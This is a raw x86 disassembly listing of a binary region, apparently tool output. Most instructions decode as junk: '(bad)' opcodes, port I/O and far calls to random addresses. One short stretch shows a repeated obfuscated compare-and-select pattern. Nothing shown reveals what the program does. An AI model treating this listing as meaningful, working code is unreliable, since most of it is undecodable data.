  403ae7:	ins    BYTE PTR es:[edi],dx
  403ae8:	inc    esi
  403ae9:	sub    eax,0x3ea92cbb
  403aee:	fdivr  QWORD PTR [ebx-0x1d]
  403af1:	adc    BYTE PTR [ebp+0x54],ah
  403af4:	retf   0xfb72
  403af7:	xor    DWORD PTR [eax],ebx
  403af9:	sub    eax,DWORD PTR ds:0x193105ea
  403aff:	ret    0xee57
  403b02:	iret   
  403b03:	jnp    0x403a8c
  403b05:	arpl   bx,dx
  403b07:	scas   al,BYTE PTR es:[edi]
  403b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b09:	in     eax,dx
  403b0a:	loope  0x403b5a
  403b0c:	sbb    BYTE PTR [edi+0x37],dl
  403b0f:	std    
  403b10:	fild   QWORD PTR [esi-0x533e8ccc]
  403b16:	push   eax
  403b17:	sub    BYTE PTR [eax-0x13],ch
  403b1a:	and    DWORD PTR [edi],eax
  403b1c:	(bad)  
  403b1d:	xchg   esi,eax
  403b1e:	call   0xa94d90d2
  403b23:	sar    BYTE PTR [eax-0x63],cl
  403b26:	sbb    ah,BYTE PTR [esi-0x64af029e]
  403b2c:	rol    BYTE PTR [ecx-0x71],1
  403b2f:	pop    es
  403b30:	jnp    0x403b75
  403b32:	add    dh,bl
  403b34:	ret    0x1db9
  403b37:	clc    
  403b38:	pusha  
  403b39:	mov    ecx,0xde378c08
  403b3e:	mov    ch,0xb5
  403b40:	adc    ah,ah
  403b42:	popf   
  403b43:	dec    edi
  403b44:	call   0x156dccc4
  403b49:	xor    al,0x3c
  403b4b:	mov    cs,ebp
  403b4d:	fstp   TBYTE PTR [edx-0x6b]
  403b50:	sub    eax,0xaa98dcc7
  403b55:	push   esp
  403b56:	or     eax,0xf6c8ea14
  403b5b:	pop    ss
  403b5c:	mov    bh,0x4d
  403b5e:	add    ch,BYTE PTR [edx-0x69d529ed]
  403b64:	mov    eax,0x2a75388c
  403b69:	imul   edx,DWORD PTR [ebp+edx*1+0x2],0x51ce4bc0
  403b71:	dec    eax
  403b72:	frstor [ecx-0x3d]
  403b75:	jl     0x403b78
  403b77:	(bad)  
  403b78:	dec    ebp
  403b79:	sbb    al,0x3a
  403b7b:	popa   
  403b7c:	push   0xe004b15a
  403b81:	das    
  403b82:	call   0xf3f4:0x23f1c8be
  403b89:	adc    al,0x3f
  403b8b:	in     al,0x9f
  403b8d:	push   0x4cc826a4
  403b92:	cdq    
  403b93:	sub    al,0xd7
  403b95:	fstp   QWORD PTR [edx+0x4d001a7d]
  403b9b:	sar    BYTE PTR [ecx],cl
  403b9d:	cmp    esi,DWORD PTR [ecx+0x48ef1515]
  403ba3:	xchg   DWORD PTR [ebp-0x5e],ecx
  403ba6:	cmc    
  403ba7:	clc    
  403ba8:	cmc    
  403ba9:	fsubrp st(2),st
  403bab:	and    DWORD PTR [edx-0x72fab278],edi
  403bb1:	pop    ds
  403bb2:	sti    
  403bb3:	cs leave 
  403bb5:	loop   0x403c19
  403bb7:	xor    edi,edi
  403bb9:	out    dx,eax
  403bba:	sbb    eax,0xb2b225a1
  403bbf:	mov    bh,cl
  403bc1:	ds loopne 0x403b64
  403bc4:	pop    ss
  403bc5:	in     al,dx
  403bc6:	pop    ss
  403bc7:	mov    dh,0xde
  403bc9:	pusha  
  403bca:	imul   edi,DWORD PTR [edx+0x4162db24],0xffffffbd
  403bd1:	xchg   edx,eax
  403bd2:	jmp    0x403c3c
  403bd4:	es ret 
  403bd6:	dec    esp
  403bd7:	das    
  403bd8:	add    ecx,DWORD PTR [eax+0x3e]
  403bdb:	mov    ah,0x3f
  403bdd:	fst    QWORD PTR [ecx+0x2fc13b0d]
  403be3:	xchg   esi,eax
  403be4:	call   0x39c0:0x1dfdcf82
  403beb:	iret   
  403bec:	jae    0x403c07
  403bee:	mov    dh,0xd
  403bf0:	(bad)  
  403bf1:	jg     0x403be0
  403bf3:	jbe    0x403b89
  403bf5:	adc    ecx,DWORD PTR [edx-0x10]
  403bf8:	push   0x455466ae
  403bfd:	scas   eax,DWORD PTR es:[edi]
  403bfe:	pop    ds
  403bff:	mov    ds:0xf53fa84e,al
  403c04:	cmp    DWORD PTR [eax],eax
  403c06:	aas    
  403c07:	(bad)  
  403c08:	push   eax
  403c09:	shl    BYTE PTR [ebx+0x62797044],0xb5
  403c10:	cmp    BYTE PTR [ebp+0x38],bh
  403c13:	sahf   
  403c14:	push   es
  403c15:	outs   dx,BYTE PTR ds:[esi]
  403c16:	repnz into 
  403c18:	sub    al,0x70
  403c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c1b:	call   0x5e157289
  403c20:	mov    dh,0xc7
  403c22:	inc    esi
  403c23:	std    
  403c24:	pusha  
  403c25:	repnz out 0x87,al
  403c28:	addr16 aaa 
  403c2a:	cld    
  403c2b:	rcl    esi,0xbf
  403c2e:	out    dx,eax
  403c2f:	das    
  403c30:	dec    eax
  403c31:	jl     0x403ca2
  403c33:	mov    ds:0x95bd0e7a,al
  403c38:	les    ebp,FWORD PTR [edx-0x32]
  403c3b:	xchg   edx,eax
  403c3c:	or     ebx,DWORD PTR [ecx-0x76]
  403c3f:	sub    DWORD PTR [ebx],edx
  403c41:	push   es
  403c42:	fld    QWORD PTR [ebx-0x10a2610b]
  403c48:	sbb    ah,BYTE PTR [eax+ebx*2-0x67]
  403c4c:	std    
  403c4d:	imul   ecx,DWORD PTR [esi-0x7edbac05],0x45
  403c54:	push   ecx
  403c55:	mov    ds:0x5dba4323,al
  403c5a:	mov    al,ds:0xaab2dd19
  403c5f:	dec    edx
  403c60:	add    DWORD PTR [esi],eax
  403c62:	test   DWORD PTR [edi+eax*2],ecx
  403c65:	mov    dl,0xc8
  403c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c68:	test   al,0x3c
  403c6a:	idiv   BYTE PTR [eax+0x6ac0f09c]
  403c70:	ins    BYTE PTR es:[edi],dx
  403c71:	sbb    al,0x8f
  403c73:	mov    bh,0xc5
  403c75:	xor    BYTE PTR [eax-0x42c97c34],al
  403c7b:	clc    
  403c7c:	outs   dx,BYTE PTR ds:[esi]
  403c7d:	sbb    edx,0x98967d8e
  403c83:	sub    eax,DWORD PTR [edx-0x2e]
  403c86:	pushf  
  403c87:	jg     0x403c8a
  403c89:	call   0x76f4c136
  403c8e:	cmp    al,0x1c
  403c90:	scas   al,BYTE PTR es:[edi]
  403c91:	sub    cl,dh
  403c93:	cmc    
  403c94:	jl     0x403c54
  403c96:	jl     0x403c39
  403c98:	ficom  WORD PTR [edi]
  403c9a:	lock neg DWORD PTR [esi]
  403c9d:	inc    ebx
  403c9e:	fcomi  st,st(6)
  403ca0:	or     ah,bl
  403ca2:	lds    ebx,FWORD PTR [ecx]
  403ca4:	das    
  403ca5:	jle    0x403c4d
  403ca7:	adc    al,0x6e
  403ca9:	xor    DWORD PTR [eax-0x341ce574],edx
  403caf:	(bad)  
  403cb0:	xchg   ecx,eax
  403cb1:	lahf   
  403cb2:	lahf   
  403cb3:	lods   eax,DWORD PTR ds:[esi]
  403cb4:	ins    DWORD PTR es:[edi],dx
  403cb5:	mov    ecx,0xac5ad9c6
  403cba:	mov    ds:0x960e10fc,eax
  403cbf:	retf   
  403cc0:	retf   
  403cc1:	push   ecx
  403cc2:	mov    ebx,0x2090744b
  403cc7:	std    
  403cc8:	mov    BYTE PTR [esi+0x5dc51690],bl
  403cce:	retf   0xceef
  403cd1:	mov    ebp,0x4581d424
  403cd6:	fisubr DWORD PTR [esp+ebp*4]
  403cd9:	call   0x6f56ea34
  403cde:	lahf   
  403cdf:	test   DWORD PTR [eax],eax
  403ce1:	lock ret 0xed63
  403ce5:	dec    ebx
  403ce6:	rol    esp,0xf1
  403ce9:	(bad)  [esi-0x71]
  403cec:	ret    
  403ced:	jmp    0xca57dfba
  403cf2:	xor    al,0x44
  403cf4:	shl    DWORD PTR [ecx-0x23],0xae
  403cf8:	jbe    0x403d20
  403cfa:	mov    edx,eax
  403cfc:	lds    ebx,FWORD PTR [edx-0x4b]
  403cff:	out    dx,eax
  403d00:	in     eax,dx
  403d01:	pop    ss
  403d02:	aas    
  403d03:	jge    0x403d47
  403d05:	pop    edi
  403d06:	(bad)  [ecx+ecx*4]
  403d09:	out    dx,al
  403d0a:	mov    dl,0x84
  403d0c:	or     al,0xe8
  403d0e:	rol    DWORD PTR [edi-0x80],cl
  403d11:	push   ss
  403d12:	shl    BYTE PTR ds:0xd2fc2e11,cl
  403d18:	hlt    
  403d19:	mov    bh,BYTE PTR [esi+0x0]
  403d1c:	and    ecx,DWORD PTR [ebx+0x15ec00e0]
  403d22:	(bad)  
  403d23:	mov    es,WORD PTR [edx]
  403d25:	or     edx,esp
  403d27:	mov    esi,0xde73e655
  403d2c:	dec    eax
  403d2d:	jp     0x403d86
  403d2f:	xlat   BYTE PTR ds:[ebx]
  403d30:	xchg   BYTE PTR [edi-0x51],bh
  403d33:	sti    
  403d34:	pop    esi
  403d35:	sahf   
  403d36:	popa   
  403d37:	jo     0x403cdb
  403d39:	sbb    DWORD PTR [ebx-0x55e9818e],ebp
  403d3f:	ss xchg ah,bl
  403d42:	aad    0x1b
  403d44:	xchg   esp,eax
  403d45:	cmc    
  403d46:	outs   dx,DWORD PTR ds:[esi]
  403d47:	pop    ss
  403d48:	jnp    0x403d0d
  403d4a:	nop
  403d4b:	adc    eax,0x6eb6c39e
  403d50:	mov    ebx,0xf249170b
  403d55:	push   eax
  403d56:	cmc    
  403d57:	(bad)  
  403d58:	out    dx,eax
  403d59:	frstor [ebp-0x2a861848]
  403d5f:	xor    eax,0xcb60e099
  403d64:	pusha  
  403d65:	test   eax,0x1167424e
  403d6a:	jb     0x403d74
  403d6c:	cli    
  403d6d:	or     eax,0xe5ecf75f
  403d72:	dec    edi
  403d73:	sub    eax,0xd6f0961a
  403d78:	mov    dl,0xcd
  403d7a:	fadd   DWORD PTR [ebx-0x7f0dcc63]
  403d80:	inc    esi
  403d81:	aas    
  403d82:	fmul   QWORD PTR [edx+0x1ce79eb3]
  403d88:	mov    DWORD PTR [eax-0x7a],eax
  403d8b:	jns    0x403d11
  403d8d:	inc    edi
  403d8e:	pop    ebp
  403d8f:	xor    al,0x49
  403d91:	(bad)  
  403d92:	pop    ebp
  403d93:	fiadd  DWORD PTR [ebx-0x3f]
  403d96:	mov    al,0x8a
  403d98:	pushf  
  403d99:	scas   eax,DWORD PTR es:[edi]
  403d9a:	mov    ds:0xd11cd0d,eax
  403d9f:	clc    
  403da0:	xor    bl,ah
  403da2:	mov    ebx,0x9e08e8b9
  403da7:	shl    BYTE PTR [ebx-0x40],0xb8
  403dab:	(bad)  
  403dac:	aad    0xdd
  403dae:	popa   
  403daf:	je     0x403ddf
  403db1:	(bad)  
  403db3:	dec    edi
  403db4:	push   eax
  403db5:	add    bl,BYTE PTR [eax]
  403db7:	push   esp
  403db8:	(bad)  
  403db9:	lods   al,BYTE PTR ds:[esi]
  403dba:	hlt    
  403dbb:	push   ecx
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x27
  403e75:	pop    edi
  403e76:	shr    BYTE PTR [edx+0xa],0x1f
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403ee9
  403e81:	mov    ah,0x82
  403e83:	lods   eax,DWORD PTR ds:[esi]
  403e84:	push   ebx
  403e85:	push   ecx
  403e86:	dec    esp
  403e87:	scas   al,BYTE PTR es:[edi]
  403e88:	inc    edi
  403e89:	jnp    0x403e65
  403e8b:	ds pop ecx
  403e8d:	pcmpgtw mm2,QWORD PTR [eax]
  403e90:	dec    ebx
  403e91:	cwde   
  403e92:	in     eax,dx
  403e93:	dec    eax
  403e94:	sub    al,BYTE PTR [edi-0x4f]
  403e97:	sbb    BYTE PTR [eax+ebp*4],0xab
  403e9b:	mov    cl,0x56
  403e9d:	push   esp
  403e9e:	nop
  403e9f:	popa   
  403ea0:	icebp  
  403ea1:	cwde   
  403ea2:	ins    DWORD PTR es:[edi],dx
  403ea3:	int3   
  403ea4:	ret    0x6ed5
  403ea7:	pushf  
  403ea8:	cs push edi
  403eaa:	dec    ebp
  403eab:	mov    bh,0x34
  403ead:	push   edx
  403eae:	repz mov edx,esi
  403eb1:	mov    bh,0x94
  403eb3:	idiv   BYTE PTR [ebx-0x4d]
  403eb6:	cmp    DWORD PTR [ebp+0x7758ea9c],eax
  403ebc:	enter  0xcc5f,0x66
  403ec0:	leave  
  403ec1:	and    al,0x88
  403ec3:	pusha  
  403ec4:	(bad)
  403ec7:	push   edi
  403ec8:	dec    esp
  403ec9:	clc    
  403eca:	xor    esp,ecx
  403ecc:	js     0x403f2f
  403ece:	or     ch,al
  403ed0:	fs repz enter 0x18fa,0x67
  403ed6:	loop   0x403e66
  403ed8:	(bad)  
  403ed9:	adc    BYTE PTR [edx-0x1b],al
  403edc:	pop    edi
  403edd:	in     al,dx
  403ede:	mov    BYTE PTR [ecx-0x61615ecb],dl
  403ee4:	sbb    cl,BYTE PTR [ebx-0x2efa7f89]
  403eea:	adc    DWORD PTR [esi],edi
  403eec:	sub    eax,0x5a8f48fa
  403ef1:	push   edx
  403ef2:	xchg   esp,eax
  403ef3:	xchg   ebp,eax
  403ef4:	imul   ebp,esi,0x40d0d124
  403efa:	dec    edx
  403efb:	test   DWORD PTR [ebx-0x476ca817],edi
  403f01:	daa    
  403f02:	arpl   WORD PTR [edi+0xbcc6cdd],bp
  403f08:	xor    cl,BYTE PTR [eax+0x7285eaba]
  403f0e:	and    edi,ebx
  403f10:	mov    esp,0x16eee93e
  403f15:	test   eax,0xcf5ae6a8
  403f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f1b:	xchg   ecx,esp
  403f1d:	pop    edx
  403f1e:	out    dx,al
  403f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f20:	cs adc dl,0x2c
  403f24:	(bad)  
  403f25:	fnstenv [ebx]
  403f27:	pop    ds
  403f28:	add    al,0x9f
  403f2a:	or     eax,0x135e301f
  403f2f:	aam    0xc6
  403f31:	call   0xf1d5:0xea75307c
  403f38:	aaa    
  403f39:	test   al,0x6e
  403f3b:	pusha  
  403f3c:	xor    ch,BYTE PTR [esi-0x7f583abf]
  403f42:	or     ebp,ebp
  403f44:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f47:	outs   dx,DWORD PTR ds:[esi]
  403f48:	sub    eax,0xc4684138
  403f4d:	stc    
  403f4e:	inc    edx
  403f4f:	jnp    0x403fa2
  403f51:	je     0x403f9e
  403f53:	jl     0x403fc9
  403f55:	jno    0x403fd3
  403f57:	mov    ch,0x64
  403f59:	sub    bl,BYTE PTR [edx-0x51b7e085]
  403f5f:	test   eax,0x67b27d8b
  403f64:	cs mov edx,0x98acf937
  403f6a:	packsswb mm1,QWORD PTR [eax+edx*8-0xb]
  403f6f:	sub    ebx,eax
  403f71:	rcl    BYTE PTR [edx+0x5ac39603],cl
  403f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f78:	ja     0x403f7c
  403f7a:	jmp    0xa65c:0xe06420bf
  403f81:	lea    ecx,[edx]
  403f83:	ds pop eax
  403f85:	inc    ecx
  403f86:	dec    edi
  403f87:	test   DWORD PTR [ebx+edi*8-0x58708cd1],0x1225e99f
  403f92:	jp     0x403f8d
  403f94:	fadd   DWORD PTR cs:[edx+0x263b8dd9]
  403f9b:	jmp    0x6c92:0x2b9ee600
  403fa2:	push   es
  403fa3:	push   0xffffffd5
  403fa5:	lods   eax,DWORD PTR ds:[esi]
  403fa6:	or     al,0xb7
  403fa8:	je     0x403f51
  403faa:	sbb    ch,BYTE PTR [edi-0x41]
  403fad:	push   edi
  403fae:	add    DWORD PTR [ecx-0x1d71047c],ebx
  403fb4:	(bad)  
  403fb5:	pop    ebx
  403fb6:	sub    DWORD PTR [edi+0x25],ecx
  403fb9:	out    dx,eax
  403fba:	stos   BYTE PTR es:[edi],al
  403fbb:	xlat   BYTE PTR ds:[ebx]
  403fbc:	in     eax,dx
  403fbd:	jbe    0x404034
  403fbf:	mov    edi,0xbde03253
  403fc4:	cld    
  403fc5:	scas   al,BYTE PTR es:[edi]
  403fc6:	outs   dx,DWORD PTR ds:[esi]
  403fc7:	call   FWORD PTR [ebx]
  403fc9:	int    0x96
  403fcb:	ins    BYTE PTR es:[edi],dx
  403fcc:	mov    ecx,0x424c44a
  403fd1:	loopne 0x40402f
  403fd3:	rcr    DWORD PTR [ebp+0x42],1
  403fd6:	out    dx,eax
  403fd7:	sar    bl,1
  403fd9:	mov    bh,0x1f
  403fdb:	pop    ebx
  403fdc:	sbb    al,0x46
  403fde:	mov    esp,ss
  403fe0:	shl    dh,1
  403fe2:	jg     0x404039
  403fe4:	pusha  
  403fe5:	mov    edx,0x54945827
  403fea:	jle    0x403f6d
  403fec:	jne    0x403f85
  403fee:	(bad)  
  403fef:	int3   
  403ff0:	inc    ebp
  403ff1:	addr16 cld 
  403ff3:	adc    eax,0x9598ef0a
  403ff8:	bound  ecx,QWORD PTR [esi+0x6da1da68]
  403ffe:	xor    ah,BYTE PTR [eax+0x56]
  404001:	in     al,0x1f
  404003:	aaa    
  404004:	popa   
  404005:	mov    edi,0xfbbe9f4a
  40400a:	push   edi
  40400b:	mov    cl,al
  40400d:	xchg   ebx,eax
  40400e:	adc    esi,DWORD PTR [edx-0x4b719bde]
  404014:	mov    ?,WORD PTR [edx+eiz*4]
  404017:	xchg   ebp,eax
  404018:	mov    eax,edi
  40401a:	or     al,0x15
  40401c:	mov    cl,bh
  40401e:	or     DWORD PTR [ebp-0x3d],esi
  404021:	mov    esp,0x726f860f
  404026:	int3   
  404027:	xor    esp,DWORD PTR [esi+0x71]
  40402a:	inc    eax
  40402b:	mov    dl,0xb0
  40402d:	rol    DWORD PTR [eax-0x59853339],0x13
  404034:	cmp    BYTE PTR [ebx],cl
  404036:	loopne 0x403fe2
  404038:	pop    ebp
  404039:	fst    QWORD PTR [edx-0x3403d11f]
  40403f:	dec    esi
  404040:	xlat   BYTE PTR ds:[ebx]
  404041:	int3   
  404042:	xchg   BYTE PTR [edx],bh
  404044:	cdq    
  404045:	cmc    
  404046:	xchg   esi,eax
  404047:	out    0x33,al
  404049:	push   esi
  40404a:	push   edi
  40404b:	call   0xceeb2fc6
  404050:	xchg   ebx,eax
  404051:	(bad)  
  404052:	ret    0xf887
  404055:	push   eax
  404056:	sub    al,0x59
  404058:	mov    ds:0xe56e0110,eax
  40405d:	out    0x66,eax
  40405f:	dec    edx
  404060:	pop    edx
  404061:	cdq    
  404062:	out    dx,eax
  404063:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404065:	ret    
  404066:	push   ss
  404067:	or     al,0xfb
  404069:	(bad)  
  40406a:	les    ecx,FWORD PTR [ebx+0x1bf1edd6]
  404070:	jl     0x404082
  404072:	out    0x5f,eax
  404074:	ret    
  404075:	inc    ebp
  404076:	cmc    
  404077:	setns  al
  40407a:	(bad)
  40407e:	es pop edi
  404080:	dec    eax
  404081:	mov    BYTE PTR [eax+0x4e],dh
  404084:	popa   
  404085:	cwde   
  404086:	cmp    eax,0x9f7ac437
  40408b:	fstp   DWORD PTR [edi]
  40408d:	outs   dx,BYTE PTR ds:[esi]
  40408e:	aad    0x91
  404090:	pop    edi
  404091:	stos   BYTE PTR es:[edi],al
  404092:	pop    edx
  404093:	push   ds
  404094:	xor    al,0xa6
  404096:	sub    BYTE PTR [ebx-0x5f],ah
  404099:	in     eax,0x85
  40409b:	xchg   BYTE PTR [esi-0x7],ch
  40409e:	add    DWORD PTR [edx+0x3],esi
  4040a1:	sub    BYTE PTR [ebp+eiz*8-0x28],cl
  4040a5:	int3   
  4040a6:	add    eax,0x71fc0db2
  4040ab:	and    ebp,ebx
  4040ad:	cmp    DWORD PTR [ecx],esi
  4040af:	imul   ebp,DWORD PTR ds:[edi-0x11],0x15
  4040b4:	icebp  
  4040b5:	bswap  esi
  4040b7:	pop    ds
  4040b8:	push   edi
  4040b9:	(bad)  
  4040ba:	jle    0x404070
  4040bc:	fs inc esp
  4040be:	fnstsw WORD PTR [esi]
  4040c0:	push   edx
  4040c1:	scas   eax,DWORD PTR es:[edi]
  4040c2:	xchg   edi,eax
  4040c3:	inc    edx
  4040c4:	mov    ds:0x7904d432,eax
  4040c9:	pop    ebp
  4040ca:	sub    al,0x93
  4040cc:	mov    ebx,0xcdea5413
  4040d1:	sub    eax,0xc09b24b1
  4040d6:	leave  
  4040d7:	int    0x54
  4040d9:	add    al,0xf2
  4040db:	xor    BYTE PTR [ebp+edi*2+0x5bcec650],ah
  4040e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e3:	bound  edi,QWORD PTR [esp+edi*8-0x23176a80]
  4040ea:	push   eax
  4040eb:	lea    edi,[edi+0x24]
  4040ee:	sub    BYTE PTR [esi+0x2ea389e4],dl
  4040f4:	into   
  4040f5:	sub    DWORD PTR [esi],ebp
  4040f7:	mov    esp,0x873098b0
  4040fc:	call   0x803fbe2f
  404101:	xor    al,0x5a
  404103:	ins    DWORD PTR es:[edi],dx
  404104:	ins    DWORD PTR es:[edi],dx
  404105:	xlat   BYTE PTR ds:[ebx]
  404106:	pop    eax
  404107:	xchg   edx,eax
  404108:	mov    al,0xb7
  40410a:	adc    bl,0x8a
  40410d:	pop    eax
  40410e:	and    DWORD PTR [ebx],eax
  404110:	rcr    DWORD PTR [ebx],1
  404112:	cmp    ch,BYTE PTR [edx]
  404114:	fsubr  st,st(2)
  404116:	fldenv [edx-0x2c]
  404119:	out    dx,al
  40411a:	dec    ebx
  40411b:	int    0x49
  40411d:	mov    ds:0x151c43e6,al
  404122:	ret    0x4c76
  404125:	mov    al,0x9c
  404127:	leave  
  404128:	cmp    ebx,DWORD PTR [edx+0x2b60e422]
  40412e:	sbb    eax,0x567104e8
  404133:	repz mov ah,BYTE PTR [esi+0x791f2d3]
  40413a:	fisub  DWORD PTR [esi-0x7f9188a5]
  404140:	cwde   
  404141:	sbb    cl,BYTE PTR [ebx]
  404143:	jp     0x4041b4
  404145:	pop    edx
  404146:	add    eax,0x832e8e02
  40414b:	mov    ebp,0xa8c23ae
  404150:	test   ch,bh
  404152:	xor    eax,0x5af2d6a2
  404157:	mov    al,0x42
  404159:	test   eax,0xa8b0ff53
  40415e:	dec    edx
  40415f:	mov    dl,0x3f
  404161:	ret    0xd895
  404164:	jge    0x4041d2
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edi+0x74c914a6],bh
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	pop    edx
  404197:	adc    cl,al
  404199:	mov    esi,0xd1f0cc8b
  40419e:	test   eax,0x9526ce64
  4041a3:	sub    eax,0x41003c69
  4041a8:	mov    esp,0xaea29a85
  4041ad:	int    0xfa
  4041af:	test   BYTE PTR ds:0x29f0400f,bh
  4041b5:	jle    0x40416d
  4041b7:	in     eax,0x59
  4041b9:	test   al,0x1c
  4041bb:	push   0xffffff81
  4041bd:	cmp    BYTE PTR [ebp+0x202c650a],0xcd
  4041c4:	and    eax,0x5a7ded9c
  4041c9:	xor    DWORD PTR [ecx+0x16],0x9a66d9a8
  4041d0:	sub    eax,0xc6e1a0f1
  4041d5:	bound  ebx,QWORD PTR [ebp-0x75]
  4041d8:	pusha  
  4041d9:	sub    BYTE PTR [ebp-0x7696865e],ch
  4041df:	call   0x9c5f:0xb1268d5c
  4041e6:	sub    eax,0x73cba9f7
  4041eb:	add    eax,0x6c12f6db
  4041f0:	loop   0x40420c
  4041f2:	das    
  4041f3:	mov    ss,ecx
  4041f5:	mov    eax,0x55d5c519
  4041fa:	mov    BYTE PTR [esi],dh
  4041fc:	bound  esp,QWORD PTR [esi+0x6]
  4041ff:	sbb    BYTE PTR [esi],bh
  404201:	xor    al,0x18
  404203:	xchg   ebp,eax
  404204:	sbb    al,0xcf
  404206:	repz sbb BYTE PTR [ebx],0x48
  40420a:	loope  0x4041af
  40420c:	add    DWORD PTR [ecx-0x54],ecx
  40420f:	push   ss
  404210:	inc    esi
  404211:	sbb    eax,0x8c3c6181
  404216:	dec    ebx
  404217:	sbb    ebx,DWORD PTR [ecx+eax*1+0x28032e0]
  40421e:	bound  edx,QWORD PTR [ebp+0x21]
  404221:	mov    esp,0x193b7aa1
  404226:	dec    esp
  404227:	ins    BYTE PTR es:[edi],dx
  404228:	out    dx,eax
  404229:	add    esp,edi
  40422b:	inc    edx
  40422c:	sbb    DWORD PTR [ecx-0x7d],edi
  40422f:	xor    bl,bh
  404231:	pop    edi
  404232:	stc    
  404233:	rcr    DWORD PTR [ecx+esi*2+0x10],cl
  404237:	(bad)  
  404238:	xor    eax,0xb8552a0e
  40423d:	(bad)  
  40423f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404240:	pop    eax
  404241:	lds    ebp,FWORD PTR [edi]
  404243:	xchg   ebp,eax
  404244:	(bad)  
  404245:	jmp    0xed9fb5bd
  40424a:	xor    edx,eax
  40424c:	adc    al,0xb1
  40424e:	fs into 
  404250:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404252:	xchg   esp,eax
  404253:	dec    ebp
  404254:	popf   
  404255:	sahf   
  404256:	in     al,dx
  404257:	pop    ebx
  404258:	ins    BYTE PTR es:[edi],dx
  404259:	rcl    bh,0x53
  40425c:	xor    al,0xd0
  40425e:	scas   al,BYTE PTR es:[edi]
  40425f:	xchg   esp,eax
  404260:	es aaa 
  404262:	cs jl  0x4042cf
  404265:	mov    eax,ds:0x2a8f2410
  40426a:	push   ecx
  40426b:	sahf   
  40426c:	int    0xc5
  40426e:	cwde   
  40426f:	jnp    0x40429f
  404271:	xchg   ebp,eax
  404272:	lds    eax,FWORD PTR [esi-0x2a]
  404275:	gs pop eax
  404277:	rcl    BYTE PTR [edx+0x30],0x66
  40427b:	dec    ecx
  40427c:	gs xchg ecx,eax
  40427e:	fcmovb st,st(3)
  404280:	fst    QWORD PTR [esi+0x1bd6a192]
  404286:	adc    dl,bh
  404288:	push   edx
  404289:	int3   
  40428a:	mov    ebx,0x37dab0f1
  40428f:	xor    eax,0xd0147a3d
  404294:	and    eax,DWORD PTR [ecx+0x1e]
  404297:	jae    0x4042ad
  404299:	adc    esi,DWORD PTR [esi-0x59391987]
  40429f:	(bad)  
  4042a0:	pop    edi
  4042a1:	adc    al,0x95
  4042a3:	cdq    
  4042a4:	mov    esi,ss
  4042a6:	rcl    DWORD PTR [esi+0x6628bb16],1
  4042ac:	out    dx,al
  4042ad:	out    0xec,al
  4042af:	int    0x3a
  4042b1:	clc    
  4042b2:	ins    DWORD PTR es:[edi],dx
